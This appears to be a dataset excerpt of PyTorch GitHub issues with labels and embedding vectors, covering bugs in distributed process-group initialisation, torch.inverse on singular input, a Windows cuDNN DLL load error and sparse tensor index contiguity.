 -2.48260483e-01 -3.37633416e-02 -7.06970543e-02 -1.03940979e-01
  9.95380282e-02  1.37036577e-01 -6.37764707e-02 -1.74993545e-01
  1.18767232e-01  1.15337282e-01 -7.86556974e-02 -1.84355825e-01
  6.80542439e-02 -3.97358626e-01 -1.35768026e-01  5.42494416e-01
  5.88001944e-02 -1.47295550e-01  2.59352297e-01  1.47516876e-01
 -2.12450951e-01  1.66784137e-01 -1.61981225e-01  2.83547163e-01
  2.40797639e-01  1.32369474e-01 -1.26890361e-01  4.24055874e-01
 -4.03816342e-01 -1.52096361e-01 -3.64518166e-01 -3.43046844e-01
  4.63551991e-02 -1.38862133e-01 -2.17056684e-02  8.95289108e-02
  2.56015778e-01  4.28412668e-03  2.55667530e-02 -8.67496356e-02
  1.40181750e-01  3.71125162e-01  1.94593504e-01 -6.97003007e-02
  2.63170395e-02  3.15046534e-02  3.12268257e-01  1.51926726e-01
 -3.00283104e-01 -1.23702347e-01 -5.89860119e-02  8.58108699e-02]"
_group_count global variable corrupted on failed distributed process group initialisation oncall: distributed triaged module: c10d,"## ðŸ› Bug

On process group initialisation failure the global variable `torch.distributed.distributed_c10d._group_count` can be incremented by one even though no process group is created. This is because the counter is incremented at the beginning of `_new_process_group_helper` (https://github.com/pytorch/pytorch/blob/master/torch/distributed/distributed_c10d.py#L491) while the other global variables are set at the end.

This matters because depending on the crashing and recovery process the variable may end up taking a different value for different processes. And since the counter is used as a prefix for the `PrefixStore` the processes will be using different keys, leading to a socket timeout.

This issue cannot be ""correctly"" prevented since `_group_count` is private and `destroy_process_group` cannot be called here since the process group doesn't exist. It can be prevented by explicitly providing a group name to `init_process_group`, but the argument is marked as deprecated.

## To Reproduce

The following code :

```
import torch.distributed.distributed_c10d as c10d
import datetime

def print_global_vars():
    print(""==========="")
    print(""_pg_map"", c10d._pg_map)
    print(""_pg_names"", c10d._pg_names)
    print(""_pg_group_ranks"", c10d._pg_group_ranks)
    print(""_default_pg"", c10d._default_pg)
    print(""_default_pg_init_method"", c10d._default_pg_init_method)
    print(""_group_count"", c10d._group_count)

print_global_vars()
try:
    c10d.init_process_group(""gloo"", timeout=datetime.timedelta(milliseconds=1), rank=0, world_size=2, init_method=f""tcp://127.0.0.1:8000"")
except RuntimeError:
    pass

print_global_vars()
```

This shows the following output:

```
===========
_pg_map {}
_pg_names {}
_pg_group_ranks {}
_default_pg None
_default_pg_init_method None
_group_count 0
===========
_pg_map {}
_pg_names {}
_pg_group_ranks {}
_default_pg None
_default_pg_init_method None
_group_count 1
```

## Expected behavior

It should be possible to recover from a failed call to `init_process_group` with public methods such as `is_initialized` and `destroy_process_group`. In the current implementation this means the call should leave the global variables in a consistent state, i.e. either none or all of them should be modified. In the above example, `_group_count` should remain at zero. 


## Environment

```
Collecting environment information...
PyTorch version: 1.6.0
Is debug build: False
CUDA used to build PyTorch: 10.2
ROCM used to build PyTorch: N/A

OS: Ubuntu 18.04.5 LTS (x86_64)
GCC version: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
Clang version: Could not collect
CMake version: version 3.18.2

Python version: 3.7 (64-bit runtime)
Is CUDA available: True
CUDA runtime version: Could not collect
GPU models and configuration: GPU 0: Quadro M1200
Nvidia driver version: 450.66
cuDNN version: Could not collect
HIP runtime version: N/A
MIOpen runtime version: N/A

Versions of relevant libraries:
[pip3] numpy==1.19.2
[pip3] pytorch-lightning==0.8.5
[pip3] torch==1.6.0
[pip3] torchelastic==0.2.0
[pip3] torchvision==0.7.0
[conda] Could not collect
```

## Additional context

This issue happens in an elastic training training context where the main process group is frequently reinitialised, and there is a rare crash where the initialisation fails due to a broken pairwise connection. I am unsure if this is due to a networking error or a bug in the code, but the above issue makes it difficult to recover from the crash. This is in part because some of the processes crash in `ProcessGroupGloo.__init__`,  leading to inconsistent state, while others crash in the `barrier()` call at the end of `init_process_group`. The recovery process is roughly as follow:
```
while True:
    try:
        torch.distributed.init_process_group(...)
        break
    except Exception:
        if torch.distributed.is_initialized():
            torch.distributed.destroy_process_group()
```
But `_group_count` can be different across processes, so the recovery won't work.

cc @pietern @mrshenli @pritamdamania87 @zhaojuanmao @satgera @rohan-varma @gqchen @aazzolini @xush6528 @osalpekar @jiayisuse @agolynski",True,"[-0.48469755 -0.20452428 -0.25991142  0.08843719 -0.06369223 -0.10928726
  0.17501807  0.24313511 -0.26583278  0.01431409  0.2396553   0.09354597
  0.09339228  0.19154708 -0.15885416  0.01772562 -0.19213177 -0.5564127
 -0.27064863 -0.31738305 -0.00177062 -0.11172489  0.02711598  0.05077435
  0.04935354  0.06192274 -0.47317088 -0.18664736  0.43226582  0.3190567
  0.00669203  0.18931454  0.11691163  0.00858972  0.17341739  0.09323242
 -0.19060098  0.06950625 -0.21039914 -0.06729151  0.25313905  0.16716304
 -0.0362142  -0.06692798 -0.1664363  -0.22392261 -0.37526172  0.24511272
 -0.5763595  -0.23654243  0.19771664  0.24442974 -0.09189005 -0.15435967
  0.21753676 -0.4545264  -0.21584357  0.13496071  0.07383196 -0.30140096
  0.04878921 -0.36162972 -0.00485666  0.05051622 -0.01830976 -0.038129
  0.1516476   0.01465463  0.4556188   0.02656828  0.12194078  0.22626652
 -0.00768034 -0.00268096  0.07877816 -0.01895238 -0.45761648  0.10034128
 -0.16917437 -0.2948956  -0.00763778  0.25252077  0.1402453  -0.01073908
 -0.09553627 -0.17187549  0.37075138 -0.32270035  0.35066566  0.19000874
  0.06722225  0.27940062  0.00920853  0.36501455 -0.210241    0.17382865
  0.16771331  0.02647255 -0.10807904 -0.02313545 -0.12017369 -0.44232035
 -0.00799221  0.2558985  -0.14884618 -0.07711719  0.06944993  0.22979987
  0.4089018  -0.0452325   0.03647222  0.14055297 -0.21232669 -0.18979135
 -0.02110896 -0.29987246  0.11220575 -0.07825901 -0.39649814 -0.02975735
  0.175923    0.06558894 -0.04614437 -0.00899031  0.3213805   0.47163838
  0.15824206 -0.16395968 -0.30865818  0.06394134  0.14786741  0.1584419
 -0.04072858 -0.13748181  0.41457707  0.3512885  -0.31574464  0.06329793
 -0.32152772  0.21090603  0.13229218 -0.01869234  0.0087544  -0.2018076
  0.32656336 -0.01602061 -0.25707284 -0.08879781 -0.0361408   0.37483853
  0.22793986 -0.08337587 -0.6637324   0.35781157 -0.04574965  0.053163
  0.16480185 -0.03502567  0.3111741  -0.19188532  0.14538975  0.22519311
 -0.08827698  0.07862009  0.29394433 -0.04858591 -0.13188352 -0.18754077
 -0.20505881 -0.05460175 -0.03629905 -0.28052828 -0.26370564 -0.4156422
 -0.18382424 -0.19079822  0.15641953  0.22235894 -0.07771383  0.40612873
  0.42612353  0.39517248  0.30998713  0.33016592  0.09762722  0.14560062
  0.32294264  0.05736399 -0.11839594 -0.29312903 -0.4845077  -0.13344756
  0.44730827  0.08585366 -0.07536024 -0.22651899  0.10142155 -0.29443938
  0.0996841  -0.04466147  0.02692358  0.45088023  0.27078918  0.10653591
  0.18554586  0.38878936 -0.44245923 -0.0188514  -0.0666726   0.11062886
 -0.3260479  -0.29210165 -0.3021963  -0.44214806 -0.044921    0.29459864
 -0.06124116  0.24277824  0.03121532  0.02534817  0.5305102   0.21576662
 -0.04102872 -0.06259729 -0.13428691  0.21067393 -0.12102238 -0.32637998
  0.3019874  -0.19037493 -0.34262535  0.05057425  0.1290579   0.2670228
  0.25336418  0.24498057 -0.07818879  0.15845771 -0.07480489  0.13957432
 -0.13480985 -0.36740553  0.21206474 -0.21371295 -0.24752423  0.27986002
 -0.40567455 -0.0510352  -0.1710242   0.05668349 -0.10807839 -0.08041891
 -0.0825078  -0.06357643  0.398242    0.02387647  0.17930374  0.15496378
 -0.09665443 -0.36139113 -0.31078196  0.18292487 -0.36164868  0.20437822
  0.09182079 -0.24724576 -0.27663985  0.26999402 -0.09667829 -0.0369111
  0.13296138 -0.34462857  0.13081533  0.02986136  0.06602585 -0.01178082
  0.3967588  -0.24821375  0.11350884  0.01065614  0.47624922  0.26619798
 -0.08197514 -0.03296177  0.24164782 -0.1526492  -0.06558774  0.08768477
 -0.13975117 -0.22155158 -0.1340301  -0.19253261  0.33011955 -0.05356884
 -0.28622955  0.28458363 -0.00914119 -0.28404123  0.13948436  0.00526231
 -0.46998566 -0.13759013 -0.16088265  0.08945654 -0.37568396  0.11240777
  0.03520545  0.08868895  0.40003282 -0.489899    0.52028865  0.17399567
 -0.05779369  0.27341053  0.15407184 -0.08834253 -0.13235097  0.24311092
  0.01834475  0.18372396 -0.06832951 -0.1054187  -0.22231416  0.33397758
  0.37734678 -0.01220745 -0.2652178   0.14942385 -0.32142374  0.11467078
  0.06873915 -0.09118652  0.30569994 -0.10114159 -0.13809136 -0.41379148
 -0.38610375  0.29279435  0.0849963  -0.21662587  0.018726   -0.16520104
  0.0843026  -0.16897199 -0.21853524 -0.22070175  0.0717169   0.19525504
 -0.08920321  0.00316234  0.30519724 -0.20130125 -0.17427567  0.31835982
  0.01842202  0.40735954 -0.24953716  0.19026059 -0.02918355  0.27219436
 -0.08374408  0.435259    0.07481813  0.08860581  0.19704595  0.21773168
 -0.22397313 -0.15491445  0.14467761 -0.04555518 -0.3481378  -0.02268204
 -0.1882304   0.02692245  0.31541073 -0.17848945  0.12354793 -0.20143804
  0.12270956  0.04956995 -0.3125079  -0.1403577  -0.1453288  -0.2327171 ]"
torch.inverse based on cuSOLVER does not raise error for singular input module: cuda triaged module: linear algebra module: correctness (silent),"## ðŸ› Bug

The cuSOLVER path in `torch.inverse` seems not to raise an error for non-invertible input.

## To Reproduce

Single matrix and 2xNxN batched input inversion is based on cuSOLVER
```python
import torch
batch_dim = 2
A = torch.eye(3, 3, dtype=dtype, device=device)
A = A.reshape((1, 3, 3))
A = A.repeat(batch_dim, 1, 1)
A[0, -1, -1] = 0  # Now A[0] is singular
Ainv = torch.inverse(A) # Doesn't raise errors Ainv[0] contains NaNs
```
General batched input case is based on MAGMA
```python
import torch
batch_dim = 3
A = torch.eye(3, 3, dtype=dtype, device=device)
A = A.reshape((1, 3, 3))
A = A.repeat(batch_dim, 1, 1)
A[0, -1, -1] = 0  # Now A[0] is singular
Ainv = torch.inverse(A) # Raises RuntimeError because input is singular
```

<!-- If you have a code sample, error messages, stack traces, please provide it here as well -->

## Expected behavior

`torch.inverse` should raise an error for singular input when input is single matrix or a batch of matrices with batch size less or equal than 2 (cuSOLVER's code path).

cc: @xwang233 


cc @ngimel @vishwakftw @jianyuh @nikitaved @pearu @mruberry @heitorschueroff",True,"[-0.3460191  -0.13458806 -0.27104965  0.11440691 -0.06620641 -0.2618538
 -0.10477731  0.04615545 -0.14013529  0.0028644  -0.03401592  0.15208335
 -0.11219095 -0.09792998 -0.13162959  0.04164674 -0.20647135  0.0267951
 -0.16344672 -0.2318836   0.09450663 -0.13478284 -0.2994188  -0.2604892
  0.03412686  0.22891682 -0.21872565 -0.07821578  0.5046941  -0.12283274
 -0.0458729  -0.12047563 -0.2806006   0.15037884 -0.0144795  -0.13473073
 -0.53497124  0.11555412 -0.09038235 -0.16113447 -0.04901624 -0.01307999
  0.05152618  0.05579747 -0.00730933  0.1018995   0.11956865  0.24674135
  0.03884189 -0.09447712  0.13380909  0.24900334  0.06387942 -0.06515271
 -0.01354494 -0.08279197 -0.2901479  -0.131491    0.04484639 -0.5983772
  0.32723206  0.05484489 -0.2362245  -0.19373077  0.07219286  0.06833269
 -0.12682979  0.11767326  0.37315625  0.22664213  0.11507265  0.11466901
  0.05530355 -0.3219821  -0.01055845  0.05683782 -0.4098913   0.01615215
 -0.24794391  0.00319962  0.488989    0.2123976  -0.30044198  0.0550928
  0.15396386 -0.04116148  0.40109608 -0.1743296   0.25066662  0.11046495
  0.08741825  0.08025584  0.05305698  0.35995138 -0.21915475 -0.035622
  0.2307418  -0.16561821 -0.03745137 -0.25133166 -0.14034268 -0.42324305
 -0.5542091   0.4960221   0.04772359 -0.18849708  0.04174487  0.24831468
  0.11548784 -0.19618574  0.27866328 -0.15856165  0.17106904 -0.04379806
 -0.12757304 -0.10650572  0.01526784 -0.16827941 -0.1782708  -0.10575951
  0.17837062  0.19103888  0.02217441  0.3016686   0.5457801  -0.01085013
  0.0202618  -0.10302953 -0.1654594   0.38776875  0.15890044 -0.07673538
  0.18081059 -0.22087905  0.09823995  0.24799354 -0.3658806   0.4018223
 -0.02832628 -0.02020974 -0.11939935  0.03382317 -0.38188353 -0.15300761
  0.31538004 -0.11872315 -0.2810526  -0.0176095   0.24153723  0.05133281
 -0.17235819 -0.10258686 -0.8254285   0.17339496  0.0471965   0.17999458
  0.17963359  0.05987963  0.41282338 -0.2723453   0.27417964  0.21405935
  0.17321804 -0.06868278  0.22772682  0.00398047 -0.00403787  0.11796965
 -0.38539302  0.3802209   0.08049358 -0.4146069   0.10718686 -0.31653208
  0.12931903 -0.14151914 -0.16368276 -0.22826827  0.07226232  0.5377246
  0.46608466  0.56616855  0.5697872   0.07675736 -0.0049614   0.26165408
  0.599632    0.20096722 -0.30221254 -0.16621293 -0.47329482 -0.6256151
 -0.31628764  0.12898304 -0.02678334  0.19610621 -0.10717467 -0.28126013
 -0.06706761  0.00685912 -0.535291   -0.1197082   0.08079156 -0.22459349
  0.19044231  0.30932647 -0.08062319 -0.58796716 -0.36733437  0.21555108
 -0.18346187 -0.24906203 -0.19421393 -0.25238806 -0.08994906  0.06609456
 -0.18238431 -0.109042   -0.18283918  0.1772748   0.5990323  -0.20135579
  0.35380247 -0.18670243  0.23049809 -0.20098233 -0.3302116  -0.08125964
 -0.05856465  0.02739494  0.1184717  -0.0871592   0.08457285  0.00844621
  0.02759051  0.34923226 -0.13797559 -0.12108973 -0.09122611  0.04003749
 -0.22816595  0.11485766  0.04958228 -0.16374394 -0.1093703   0.3224099
 -0.10678408  0.04241494 -0.23721522 -0.00563486  0.13747542  0.08265786
  0.03263674 -0.03494024  0.05653181  0.08504234  0.17925712  0.14186856
 -0.3582368   0.13855323  0.20829742  0.31522736 -0.20461313  0.37905294
  0.13475493  0.17483273 -0.04344156  0.35528886 -0.2489171  -0.04424764
 -0.25406393 -0.18304381  0.579315   -0.08519511  0.02761886 -0.3889134
  0.31379113  0.06830089  0.10792984 -0.23892683  0.21506527 -0.0880036
 -0.05618776  0.51603615  0.27515447 -0.33316574 -0.04126217 -0.02522949
  0.24106272 -0.25646877 -0.33049232  0.14147702  0.54243976 -0.24870265
 -0.22836116  0.10367948  0.27935252 -0.11776252  0.2672961  -0.03815902
 -0.0683018   0.28904742  0.16307396 -0.13698334 -0.36644253 -0.18615426
  0.1537124   0.00873981  0.2978024  -0.25457102  0.15277737 -0.05124459
  0.01003813  0.3056346  -0.1350283   0.0806509   0.28773263  0.03716049
  0.28674206  0.11455479 -0.27036548 -0.1584576  -0.1315648  -0.1994922
 -0.12286046  0.19711822 -0.15650032 -0.02537346 -0.17804775 -0.1570942
  0.07256235  0.17039073  0.3820085   0.0793278  -0.0668477  -0.0872063
  0.00531219  0.16006862  0.00634221 -0.21914338 -0.3785759   0.12867804
 -0.06484099 -0.14009067 -0.11899832 -0.14466146  0.10910481  0.10260087
 -0.2114043   0.07489064 -0.29507828  0.01872128  0.20095165  0.20874333
  0.07168414  0.46966764  0.2380276  -0.023024   -0.2936675   0.00938761
  0.11834376  0.29662448 -0.47691795 -0.247213   -0.12630095  0.06944565
  0.13460736 -0.12107144  0.00465774  0.1993658  -0.25984788  0.32233238
 -0.01848     0.1832705   0.42382115 -0.39990166  0.09476244  0.034387
  0.3749581   0.08608896  0.30882442  0.29160053 -0.11663905 -0.06424751]"
Could not load library cudnn_ops_infer64_8.dll. Error code 126 module: build module: windows triaged,"After upgrade to rtx3090, I reinstalled my Windows10 and pytorch with

>conda install pytorch torchvision cudatoolkit=11 -c pytorch-nightly

When I use nn.Conv/nn.BatchNorm layer in my module and do the forward propagation, it shows

>Could not load library cudnn_ops_infer64_8.dll. Error code 126
>Please make sure cudnn_ops_infer64_8.dll is in your library path!

in Vscode

>Process finished with exit code -1073740791 (0xC0000409)

in Pycharm

Iâ€™ve tried reinstalling pytorch and installed cuda toolkit 11 from developer.nvidia.com, but the problem remains unsolved.

```
import torch
import torch.nn as nn

class test(nn.Module):
    def __init__(self):
        super(test, self).__init__()
        self.l = nn.Conv2d(1,1,3)
    def forward(self, input):
        return self.l(input)

net = test().cuda()
print(net(torch.rand(1,1,5,5).cuda()))
```

cc @malfet @seemethere @walterddr @peterjc123 @maxluk @nbcsm @guyang3532 @gunandrose4u @smartcat2010 @mszhanyi",True,"[-0.2542349  -0.32062232 -0.22742644  0.23433596 -0.07535781 -0.09353219
 -0.5106466  -0.08154471 -0.3861639  -0.07942674 -0.17550975 -0.11668756
 -0.21277529 -0.26400566 -0.00479327  0.28483322 -0.15669057  0.00567928
  0.09658223 -0.16519696 -0.09543967  0.05890901 -0.29634088 -0.17457956
  0.4362608  -0.05655141 -0.12710345 -0.16425145  0.20200184  0.29285932
  0.12685004 -0.15824552 -0.17913121  0.26063883  0.3287647   0.02267693
 -0.34045467 -0.20847854 -0.01117036 -0.21272564  0.04899522  0.24540523
 -0.19842902 -0.07306418 -0.35934374 -0.08409319 -0.11828221  0.09531523
 -0.39506763 -0.00425386  0.00480837  0.00960188 -0.00835916 -0.00309451
  0.1139197  -0.1718781  -0.22461872  0.4050354   0.09223269  0.08731538
  0.17892502 -0.34458503  0.20550437 -0.16277114 -0.01807141  0.06516226
 -0.18111241  0.10534789  0.3680414  -0.554129   -0.00816244  0.12878862
 -0.2692289  -0.13766956  0.11456861  0.06659222 -0.08522619 -0.05319276
 -0.06942274 -0.19345509  0.12907168  0.26966223  0.17235065  0.05182729
  0.17555478 -0.16095057 -0.03738535 -0.14348109 -0.0302995  -0.03113096
  0.36091462  0.01946003 -0.063076    0.41431165  0.00753321  0.18086953
  0.19843    -0.09001825 -0.36866367 -0.45344514 -0.06474882 -0.53304595
 -0.14817688  0.521527   -0.22277391 -0.39167112  0.1706874   0.34638357
 -0.01967545 -0.1963218   0.3030462   0.02065402  0.03179745 -0.13269565
  0.19359651  0.13497142 -0.45280397  0.0796763  -0.13383348  0.20029455
 -0.16134852 -0.02158363  0.03238     0.04247292  0.0593489   0.141007
 -0.06254907 -0.01756028 -0.00738862  0.08459628 -0.00253377  0.30711424
  0.42217046 -0.22769547  0.21730538  0.24213243 -0.27189192 -0.3042396
 -0.10773805 -0.28980675 -0.09892744  0.04964506 -0.0348797  -0.39857984
  0.08071669  0.03771405 -0.08337808  0.33678886  0.10479866 -0.03377891
  0.04138535  0.18910398 -0.6383718   0.42276424  0.13219774  0.19197959
  0.20222068  0.03101143  0.0852467  -0.30553168  0.1099886   0.26100823
  0.06075913  0.13945293 -0.11692199 -0.09532037 -0.3448447  -0.04584674
  0.03418011  0.04876491 -0.3789258  -0.16645485  0.28183615 -0.35744622
  0.35648388 -0.12895305 -0.18114094  0.03725466  0.09297492  0.4805202
  0.2954905   0.37795413  0.5176836   0.06297982  0.31188747  0.32806602
  0.4295829  -0.0202674   0.03619612 -0.01227781 -0.28270328  0.03466574
  0.17106807 -0.21514803 -0.04420862  0.11194816 -0.01339091  0.3184656
  0.13756594 -0.06523121 -0.2234155   0.4160859   0.21557043  0.2962886
 -0.21155788 -0.03816962 -0.20570229 -0.28034228 -0.14150766  0.05899656
 -0.40520024 -0.22156128 -0.10760968 -0.01620633 -0.14885531  0.3554754
  0.27326956  0.0313269   0.25386363  0.09563036  0.05345672 -0.02399855
 -0.01174887 -0.03369559  0.29131246  0.03595595 -0.28278422 -0.00200476
 -0.09970945  0.15561637 -0.34586465 -0.23941897  0.14803255  0.01423383
  0.42077667 -0.03509287 -0.06722847  0.01413191 -0.02100822  0.21277946
 -0.23867664  0.08781793 -0.1411297  -0.10814695  0.07359985  0.11368226
 -0.21056521 -0.20969345 -0.4010582  -0.09913276  0.06925759 -0.24046995
  0.14456537 -0.13891405  0.28937382  0.142612    0.09195267 -0.02223871
 -0.00233746 -0.05510842  0.53894246  0.16431393 -0.20784727  0.05276781
  0.04253642  0.06212758 -0.33184502  0.35564736 -0.04179998  0.0987202
  0.33075836 -0.38401353  0.21711963  0.0258491   0.2365072   0.00196392
  0.3833493  -0.20510818  0.06620836 -0.02158623  0.33186218  0.33635843
  0.11468364 -0.06969429  0.09736174 -0.320212   -0.19548668 -0.3664945
 -0.15775621  0.17164496  0.05007666  0.0198991   0.3831725  -0.01334637
 -0.30796716  0.08757631  0.10763274  0.06828211 -0.06315771 -0.12193955
 -0.29150707  0.18257326  0.1065     -0.29420894 -0.26049972 -0.16144636
 -0.03971459 -0.15876523  0.4563567  -0.5221343   0.29274774  0.14606059
 -0.21194616  0.29087526 -0.05707233  0.05162904  0.01660942  0.2047537
  0.362764   -0.03135036  0.02779927 -0.15406086 -0.48844692 -0.26727134
  0.21364355  0.04157834 -0.16361524  0.18246365  0.02703657  0.28260675
  0.11575507  0.17175433  0.07765571  0.25895378  0.03878323  0.10996701
 -0.00520192  0.08449952  0.233138   -0.21619286  0.06285486  0.03935775
  0.269031   -0.15113541 -0.17031148 -0.09338585  0.1355076   0.36294812
 -0.02783734 -0.03123851 -0.09156238  0.10812318 -0.2237082  -0.02746829
 -0.10697769  0.24449573  0.17852801  0.10226626  0.1086539   0.16808508
 -0.16004993  0.2748172  -0.26366085 -0.37001246  0.23601942 -0.0943633
 -0.28435388 -0.20054409 -0.0545766   0.2603823  -0.4970035   0.11313136
 -0.108588   -0.00708875  0.1522585   0.14786693 -0.04222778 -0.05634752
 -0.14897394  0.00551101  0.09741317  0.1490596   0.02514141 -0.4934341 ]"
.to_sparse() should produce a tensor with contiguous indices module: sparse triaged,"Currently, `.to_sparse` for cuda tensor produces tensor with contiguous indices, and for cpu tensor does not:
```
In [8]: torch.randn(4,4,device=""cuda"").to_sparse().indices().is_contiguous()                                                                                                                                                                                        
Out[8]: True

In [9]: torch.randn(4,4,device=""cpu"").to_sparse().indices().is_contiguous()                                                                                                                                                                                         
Out[9]: False
```
This should be fixed by changing the contiguity of cpu `nonzero` output rather than by calling `contiguous` directly in `to_sparse`.  

cc @vincentqb @aocsa @nikitaved @pearu @mruberry",True,"[-1.20922647e-01 -1.80362672e-01 -6.34752750e-01 -6.49718195e-03
  5.19414544e-02 -1.05888903e-01 -2.23141119e-01  2.13366784e-02
 -4.85594153e-01 -1.87849194e-01  2.21574724e-01 -5.33943363e-02
  9.20595005e-02  3.32406968e-01 -6.64195120e-02  2.18255758e-01
  2.61552453e-01  2.10966453e-01 -2.51952350e-01 -1.09313298e-02
  1.50483713e-01  1.25097021e-01 -2.14180306e-01  8.19942653e-02
  1.43365964e-01 -1.56704448e-02  1.12404637e-01 -1.34646073e-01
  1.78841799e-01 -8.44352394e-02 -2.75172666e-02  8.15413445e-02
 -5.35875797e-01  3.17921698e-01  1.53333560e-01  2.62939185e-01
 -3.90264094e-01  5.20352200e-02  1.21029213e-01  3.68002243e-03
 -1.31287694e-01  5.63979000e-02  2.64412820e-01 -1.36386290e-01
  1.11903265e-01 -1.47275329e-01 -8.89308602e-02  2.43436038e-01
 -1.63602531e-01 -3.30409020e-01  1.14634484e-01  2.90528417e-01
 -2.96567082e-01 -3.42518687e-01 -2.35924706e-01  1.14333376e-01
 -2.11919397e-01 -3.11139613e-01 -2.38031149e-01 -2.33807683e-01
  4.42332983e-01  2.08060294e-01 -1.03213817e-01  4.88336563e-01
  8.12056363e-02  1.51613494e-02  5.51853597e-01 -1.72963828e-01
  5.48607171e-01 -2.33049039e-02  3.28688204e-01  1.67595729e-01
 -5.06191850e-01  1.60817295e-01  2.41023883e-01  1.78414151e-01
  9.91548598e-02  2.30326146e-01  8.57306272e-02 -3.53019774e-01
  1.00410119e-01  3.08819592e-01  1.54478401e-01 -3.33815575e-01
 -1.11818969e-01 -1.12987593e-01  4.90550876e-01  2.63473958e-01
 -1.95092082e-01 -5.44687867e-01  3.60467225e-01  1.63151503e-01
 -4.44621623e-01  1.30272463e-01 -1.03944764e-01 -2.31633022e-01
  3.57386842e-02  1.68906480e-01 -1.07831754e-01 -1.90308735e-01
 -6.10946655e-01 -1.10947207e-01 -1.14447385e-01  3.27806950e-01
 -1.14572592e-01  2.32588500e-01 -2.59921439e-02  6.16542399e-02
  2.10616086e-02  3.85828048e-01  1.81540310e-01  7.41170049e-02
  2.45810702e-01  2.20312417e-01  3.08541477e-01 -3.61182421e-01
  1.96868584e-01 -1.02414601e-02  3.27075601e-01  6.37240171e-01
 -3.79453987e-01  8.94336849e-02  9.41015594e-03  5.45375168e-01
  4.01213467e-01  3.81559730e-02  5.05349562e-02 -1.37597233e-01
  3.02107364e-01 -1.81272402e-02  3.84014323e-02 -3.34394187e-01
 -2.46333063e-01  2.82627903e-02 -9.07602608e-02 -2.03547359e-01
 -2.59398639e-01  1.06589571e-01 -3.67064655e-01  1.85819775e-01
 -1.34989634e-01  1.27793416e-01 -4.48091552e-02 -1.20749190e-01
  4.25244272e-01  3.56113315e-01 -5.02421968e-02 -2.53457516e-01
 -2.47632995e-01  4.93900657e-01 -2.89729506e-01  1.16861686e-01
 -2.61351317e-01 -3.67859036e-01 -1.50601625e-01  1.72964841e-01
 -6.64671436e-02 -1.93712674e-02 -8.48835409e-02 -4.55455422e-01
  4.10142213e-01  4.21671569e-01  3.12844008e-01  2.02649787e-01
 -4.10145558e-02  1.38321221e-01 -7.51603469e-02 -1.49072841e-01
 -2.20130399e-01  2.49061853e-01  1.90820724e-01 -3.16687346e-01
 -2.14974925e-01  2.53132284e-01  4.18796211e-01 -2.06718981e-01
 -2.94821054e-01 -5.93958497e-01 -5.09791002e-02  1.05951950e-01
 -8.12754501e-03 -4.25577164e-02  1.33518968e-02 -1.87447786e-01
  4.86402810e-02 -9.08515453e-02  2.68236667e-01  2.37432584e-01
 -4.79268551e-01 -6.27252311e-02 -2.36724779e-01 -5.85467041e-01
 -2.02825628e-02 -1.55452400e-01  1.40789509e-01 -2.06612021e-01
  2.01226935e-01 -1.72627032e-01 -1.53466329e-01  1.01940215e-01
  8.49573016e-02 -4.15399015e-01  1.00754630e-02 -7.01403469e-02
  3.55293870e-01 -1.78859711e-01 -2.51743942e-01 -3.78340691e-01
 -3.08806300e-01  2.65795439e-02 -8.84234011e-02 -9.71343368e-03
 -3.35240185e-01 -1.57955855e-01 -1.15695953e-01  1.09225079e-01
  1.14404581e-01 -3.58947366e-02 -9.46513861e-02  1.84098050e-01
  3.94901872e-01 -4.04785514e-01  1.91156447e-01 -1.84175462e-01
  1.57224000e-01 -2.63168275e-01 -6.71627373e-02  4.89809997e-02
 -8.14555511e-02 -1.89831004e-01 -1.10884517e-01 -1.97051466e-02
 -1.36007085e-01 -2.48022303e-01 -6.68668747e-02 -2.74705235e-02
  5.79541326e-01 -3.11793834e-01 -3.53280306e-02  2.83040315e-01
 -6.21172428e-01  9.26589221e-02  1.31538332e-01  3.95358741e-01
  1.01395704e-01  3.54430079e-03 -7.34283868e-03 -2.28192843e-02
 -1.68321490e-01  1.63126349e-01 -4.12176847e-01  5.37981577e-02
 -1.58828333e-01 -6.10584989e-02  6.88886046e-02 -2.35146478e-01
  8.09470713e-02 -3.46798241e-01 -2.64033712e-02  2.37109214e-01
  1.28126904e-01  2.15243399e-01 -1.65067628e-01  4.87500191e-01
 -2.20204648e-02  2.55701214e-01 -4.75525796e-01  2.57563293e-01
  2.58923560e-01 -1.66720808e-01 -7.54902959e-02 -8.91413987e-02
  1.95488147e-02 -2.80614436e-01  5.01115732e-02  2.33735278e-01
  3.51458430e-01  9.26675349e-02  2.10585520e-02  1.28306806e-01
  1.40143871e-01  1.57515839e-01 -8.00034478e-02  2.56588787e-01
 -4.84277494e-02 -1.51436314e-01 -1.88676536e-01  4.66136262e-05
 -2.40302645e-02 -1.68544903e-01 -3.71707290e-01  3.42377871e-02
 -1.20857678e-01 -1.45981595e-01 -1.99205056e-01  1.72015399e-01
  3.86616766e-01  6.61715046e-02  2.08951846e-01 -4.81087752e-02
  7.15378672e-04 -1.15621746e-01  9.59495082e-02  5.85261732e-02
 -4.35658962e-01  3.92033085e-02  3.55075210e-01 -3.36149484e-02
  5.70638359e-01  2.31923796e-02  5.72497487e-01 -7.25200772e-02
  2.51023352e-01  2.14903131e-01  8.53966326e-02  1.03909366e-01
  2.10336581e-01  4.19916779e-01  4.86640185e-01  2.33623981e-02
  7.67988414e-02 -1.47469983e-01 -2.94296920e-01 -1.98366731e-01
  5.39444126e-02  5.15818819e-02  2.73633003e-03 -6.69952333e-02
  1.60881132e-01  3.09554279e-01  1.62013799e-01 -3.58076245e-01
 -2.74473578e-01 -3.53220329e-02 -1.12667240e-01 -4.08240454e-03
 -2.00015292e-01 -4.55223247e-02  3.79683040e-02  1.32956460e-01
 -1.90142378e-01  3.19155864e-04 -4.61881459e-01 -5.49829006e-01
  3.10099363e-01 -2.51832008e-01  7.18358606e-02  3.25013161e-01
  1.21882334e-01  1.89477831e-01 -2.97797263e-01  5.97622953e-02
  7.96492398e-02 -6.79744035e-02  2.90905654e-01  4.84437644e-01
  2.52847791e-01  1.18804641e-01 -3.21664572e-01  8.69454592e-02
 -1.99627765e-02 -5.18214237e-03 -2.19743308e-02 -3.55989337e-02
  3.35476160e-01 -3.59899789e-01  2.29163900e-01 -2.34457463e-01
  1.82844505e-01 -2.59563960e-02 -1.96439356e-01  1.20283261e-01
  1.49946166e-02  4.17615891e-01  5.18881798e-01 -3.31284940e-01
 -3.62987041e-01 -6.94185793e-02  1.77179500e-01 -2.79562324e-02
 -1.00802764e-01  6.83449656e-02 -1.48709625e-01 -1.63827494e-01]"
torch.save w/ _use_new_zipfile_serialization=True corrupts state_dict high priority module: serialization triaged,"## ðŸ› Bug

